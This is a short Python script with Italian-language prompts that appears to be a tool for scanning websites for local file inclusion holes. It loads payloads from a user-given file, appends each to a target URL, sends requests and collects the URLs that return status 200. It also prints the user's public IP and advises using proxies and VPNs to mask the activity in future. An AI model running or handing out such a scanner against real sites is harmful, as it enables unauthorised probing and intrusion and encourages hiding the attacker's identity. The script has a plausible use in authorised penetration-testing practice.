import requests
import urllib.request

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDC = '\033[0m'

LFI_Payloads = []
def open_file_payload(path, url):
    try:
        with open(path, "r") as f:
            LFI_Payloads.extend([line.strip() for line in f.readlines()])
    except OSError:
        print(f"\n\nErrore nell'apertura o lettura di {path}... {bcolors.FAIL}QUITTING{bcolors.ENDC}\n\n\n")
        exit(-1)
    
    site(url, LFI_Payloads)

poss_lfi = []
def site(url, payloads):
    ip = urllib.request.urlopen('https://ident.me').read().decode('utf-8')
    
    print(f"{bcolors.OKCYAN}\nStai scansionando utilizzando questo IP: {bcolors.BOLD}{ip}{bcolors.ENDC}\n")
    print("\nIn futuro utilizza PROXIES, VPN ed altro per mascherare la tua attivita'")

    for payload in payloads:
        url_targ = url + payload

        try:
            resp = requests.get(url_targ, timeout=1)

            if resp.status_code == 200:
                poss_lfi.append(url_targ)
        except requests.RequestException as e:
            print(f"{bcolors.FAIL}Errore nella connessione a {url_targ}... {bcolors.ENDC}")

def main():
    path = input(f"\n\n\n{bcolors.HEADER}Inserisci PATH degli LFI Payloads: {bcolors.ENDC}")
    url = input(f"\n\n\n{bcolors.OKBLUE}Inserisci un URL: {bcolors.ENDC}")
    
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"
    
    open_file_payload(path, url)

if __name__ == "__main__":
    main()
